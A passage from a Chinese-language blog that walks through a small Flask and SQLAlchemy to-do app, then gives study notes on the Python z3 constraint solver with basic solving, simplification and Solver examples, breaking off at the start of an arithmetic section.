class="code"><pre><span class="line">├── app.py</span><br><span class="line">├── env</span><br><span class="line">│   ├── bin</span><br><span class="line">│   ├── include</span><br><span class="line">│   ├── lib</span><br><span class="line">│   └── pyvenv.cfg</span><br><span class="line">├── instance</span><br><span class="line">│   └── test.db</span><br><span class="line">├── __pycache__</span><br><span class="line">│   └── app.cpython-310.pyc</span><br><span class="line">├── static</span><br><span class="line">│   └── css</span><br><span class="line">└── templates</span><br><span class="line">    ├── base.html</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── update.html</span><br></pre></td></tr></table></figure><p>结构作用:</p><ul><li>static:用于装css或者js这样的外部导入文件</li><li>templates:用于装html模板渲染页面</li><li>instance:这里装db数据库文件<blockquote><p>这里导入了模块<code>flask_sqlalchemy</code></p></blockquote></li><li><strong>pycache</strong>:项目预编译字节码文件存放文件夹</li><li>env:虚拟环境<blockquote><p>同样是导入了模块<code>virtualenv</code>,用于创造不干涉系统python环境的虚拟环境</p></blockquote></li></ul><p>主要的<code>app.py</code>文件:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,request,redirect</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;sqlite:///test.db&#x27;</span></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Todo</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer,primary_key=<span class="literal">True</span>)</span><br><span class="line">    content = db.Column(db.String(<span class="number">200</span>),nullable=<span class="literal">False</span>)</span><br><span class="line">    completed = db.Column(db.Integer,default=<span class="number">0</span>)</span><br><span class="line">    date_time = db.Column(db.DateTime,default=datetime.utcnow)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt; Task %r&gt;&quot;</span> % self.<span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        task_content=request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        new_task=Todo(content=task_content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.add(new_task)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;adding wrong..&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        tasks = Todo.query.order_by(Todo.date_time).<span class="built_in">all</span>()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,tasks=tasks)    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/delete/&lt;int:id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    task_delete = Todo.query.get_or_404(<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.session.delete(task_delete)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Delete Wrong..&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/update/&lt;int:id&gt;&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"></span><br><span class="line">    task = Todo.query.get_or_404(<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        task.content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;update.html&#x27;</span>,task=task)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#create test.db</span></span><br><span class="line">    <span class="comment">#db.create_all()</span></span><br><span class="line">    </span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>接下来是渲染文件:<code>index.html</code></p><blockquote><p>一下html包含了jinja的写法</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Task Master<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    &#123;% if tasks|length &lt; 1 %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>No Tasks in there..<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Task<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Added<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Actions<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        &#123;% for task in tasks %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>&#123;&#123;task.content&#125;&#125;<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>&#123;&#123;task.date_time.date()&#125;&#125;<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/delete/&#123;&#123; task.id &#125;&#125;&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/update/&#123;&#123; task.id &#125;&#125;&quot;</span>&gt;</span>Update<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;AddTask&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>渲染页面:<code>base.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;,filename=&#x27;css/main.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    &#123;% block head %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>update.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Update Task<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/update/&#123;&#123; task.id &#125;&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; task.content &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;EditTask&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css内容:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">color</span>:cadetblue;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;sans-serif&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">700px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">    <span class="attribute">border-spacing</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">td</span>,<span class="selector-tag">th</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black ;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">form</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="python-z3-solver"><a class="markdownIt-Anchor" href="#python-z3-solver"></a> Python-z3-solver</h1><p>这个模块简单记录一下吧,可能不太全面,参考的是官方文档<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">Z3Py Guide</a><br />奶奶的,这个模块真是个神器,是真的好用,简直是相见恨晚</p><h2 id="getting-started"><a class="markdownIt-Anchor" href="#getting-started"></a> Getting Started</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = Int(&#x27;x&#x27;)</span><br><span class="line">y = Int(&#x27;y&#x27;)</span><br><span class="line">solve(x&gt;20,y&lt;7,x+2*y==12)</span><br></pre></td></tr></table></figure><p>这三条指令创建了两个Integer类型的变量(Z3带的Int函数),然后通过<code>solve</code>函数并且通过用户给出的限制内容找出符合限制的数值,常用的限制符:<code>&lt;</code>,<code>&lt;=</code>,<code>&gt;</code>,<code>&gt;=</code>,<code>==</code>,<code>!=</code>;比如说如上我就给了三条限制,如果我取消第三条限制,那么程序就会输出x=21,y=6的结果,显然符合条件的不止这一组数据,结果给出的是最近解;如果我再加一条限制x&lt;20,那么程序就会输出没有解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">set_html_mode = False</span><br><span class="line">x = Int(&#x27;x&#x27;)</span><br><span class="line">y = Int(&#x27;y&#x27;)</span><br><span class="line">print( simplify(x+y+2*x+3))</span><br><span class="line">print( simplify(x&lt;y+x+2))</span><br><span class="line">print( simplify(And(x+1&gt;=3,x**2+y**2+2&gt;=5)))</span><br></pre></td></tr></table></figure><p>介绍了公式化简,<code>set_html_mode</code>是一个控制渲染公式的开关,我这里似乎双值都没啥反应,不过问题不大;<code>simplify</code>里面放需要化简的公式或者是表达式,如果想要同时化简多个公式,可以在函数内套娃<code>And</code>函数来实现多公式\表达式的化简</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x = Int(&#x27;x&#x27;)</span><br><span class="line">y = Int(&#x27;y&#x27;)</span><br><span class="line">n = x+y &gt;= 3</span><br><span class="line">print(n)</span><br><span class="line">print(&quot;num args:&quot;,n.num_args())</span><br><span class="line">print(&quot;children:&quot;,n.children())</span><br><span class="line">print(&quot;1st arg:&quot;,n.arg(0))</span><br><span class="line">print(&quot;2nd arg:&quot;,n.arg(1))</span><br><span class="line">print(&quot;operator:&quot;,n.decl())</span><br><span class="line">print(&quot;operator name:&quot;,n.decl().name())</span><br></pre></td></tr></table></figure><p>这里主要展示了如何获取公式的基础元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x = Real(&#x27;x&#x27;)</span><br><span class="line">y = Real(&#x27;y&#x27;)</span><br><span class="line">solve(x**2+y**2&gt;3,x**3+y&lt;5)</span><br></pre></td></tr></table></figure><p>利用z3解除多元不等式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x = Real(&#x27;x&#x27;)</span><br><span class="line">y = Real(&#x27;y&#x27;)</span><br><span class="line">solve(x**2+y**2==3,x**3==2)</span><br><span class="line">set_option(precision=30)</span><br><span class="line">solve(x**2+y**2==3,x**3==2)</span><br></pre></td></tr></table></figure><p>实数计算默认到小数点后10位,然而我们可以通过set_option函数来指定小数点位数</p><p><strong>Z3中常见的一类错误就是乱用元素类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">print(type(1/3))</span><br><span class="line">print(type(RealVal(1)/3))</span><br><span class="line">print(type(Q(1,3)))</span><br><span class="line">x=Real(&#x27;x&#x27;)</span><br><span class="line">print(x+1/3)</span><br><span class="line">print(x+Q(1,3))</span><br><span class="line">print(x+RealVal(1)/3)</span><br><span class="line">print(x+&quot;1/3&quot;)</span><br><span class="line">print(x+0.25)</span><br><span class="line">==============执行后===============</span><br><span class="line">&lt;class &#x27;float&#x27;&gt;</span><br><span class="line">&lt;class &#x27;z3.z3.ArithRef&#x27;&gt;</span><br><span class="line">&lt;class &#x27;z3.z3.RatNumRef&#x27;&gt;</span><br><span class="line">x + 3333333333333333/10000000000000000</span><br><span class="line">x + 1/3</span><br><span class="line">x + 1/3</span><br><span class="line">x + 1/3</span><br><span class="line">x + 1/4</span><br></pre></td></tr></table></figure><p>还是可以很清晰地看见明显的差别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x=Real(&#x27;x&#x27;)</span><br><span class="line">solve(3*x==1)</span><br><span class="line">set_option(rational_to_decimal=True)</span><br><span class="line">set_option(precision=30)</span><br><span class="line">solve(3*x==1)</span><br></pre></td></tr></table></figure><p>这里指定了以非分数的方式输出数值,并且指定了精确到小数点后30位</p><h2 id="boolean-logic"><a class="markdownIt-Anchor" href="#boolean-logic"></a> Boolean Logic</h2><p>这里主要是跟逻辑符相关的操作部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">q=Bool(&#x27;q&#x27;)</span><br><span class="line">r=Bool(&#x27;r&#x27;)</span><br><span class="line">p=Bool(&#x27;p&#x27;)</span><br><span class="line">solve(Implies(p,q),r==Not(q),Or(Not(p),r))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">q=Bool(&#x27;q&#x27;)</span><br><span class="line">p=Bool(&#x27;p&#x27;)</span><br><span class="line">print(And(p,q,True))</span><br><span class="line">print(simplify(And(p,q,True)))</span><br><span class="line">print(simplify(And(p,False)))</span><br></pre></td></tr></table></figure><p>以上演示了z3是如何进行布尔化简的,并且可以看到z3同样是支持True和False的Python元素直接拿来使用;</p><h2 id="solver"><a class="markdownIt-Anchor" href="#solver"></a> Solver</h2><p>这一部分是对最常用的Solver接口的介绍,也不是很难并且都是常用的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x=Int(&#x27;x&#x27;)</span><br><span class="line">y=Int(&#x27;y&#x27;)</span><br><span class="line">s=Solver()</span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">s.add(x&gt;10,y==x+2)</span><br><span class="line"># check if have sat value</span><br><span class="line">print(s.check())</span><br><span class="line"># create backtrace point</span><br><span class="line">s.push()</span><br><span class="line">s.add(y&lt;11)</span><br><span class="line">print(s)</span><br><span class="line"># back to pre backtrace point</span><br><span class="line">s.pop()</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>这一部分包含了关于创建Solver解决器,并且创建回溯点和如何返回到上一个回溯点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x=Real(&#x27;x&#x27;)</span><br><span class="line">s=Solver()</span><br><span class="line">s2=Solver()</span><br><span class="line"></span><br><span class="line">s.add(x**2==3)</span><br><span class="line">print(s.check())</span><br><span class="line"></span><br><span class="line">s2.add(2**x==3)</span><br><span class="line">print(s2.check())</span><br></pre></td></tr></table></figure><p>上面这种情况会直接输出unknown,表明此方程并不是无解,而是z3不支持非多项式的问题解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x=Real(&#x27;x&#x27;)</span><br><span class="line">y=Real(&#x27;y&#x27;)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(x &gt; 1, y &gt; 1, Or(x + y &gt; 3, x - y &lt; 2))</span><br><span class="line">for c in s.assertions():</span><br><span class="line">    print(c)</span><br><span class="line">print(s.check())</span><br><span class="line"></span><br><span class="line">for k,v in s.statistics():</span><br><span class="line">    print(&quot;%s : %s&quot; % (k,v))</span><br></pre></td></tr></table></figure><p>这一部分是关于独立条件集合和性能的统计;感觉这一部分主要是用于算法优化;老实说z3范围挺广的,而且是一个非常便利的工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y,z=Reals(&#x27;x y z&#x27;)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(x&gt;1,y&gt;1,x+y&gt;3,z-x&lt;10)</span><br><span class="line">print(s.check())</span><br><span class="line"></span><br><span class="line">m=s.model()</span><br><span class="line">print(&quot;x = %s&quot; % m[x])</span><br><span class="line"></span><br><span class="line"># traverse</span><br><span class="line">for d in m.decls():</span><br><span class="line">    print(&quot;%s = %s&quot; % (d.name(),m[d]))</span><br></pre></td></tr></table></figure><p>这一部分两个重要点:1.需要快速创建多个z3变量可以在变量名后面加上s,然后参考line2的写法 2.循环便利输出有解的公式需要用到model模型遍历进行输出</p><h2 id="arithmetic"><a class="markdownIt-Anchor" href="#arithmetic"></a> Arithmetic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span 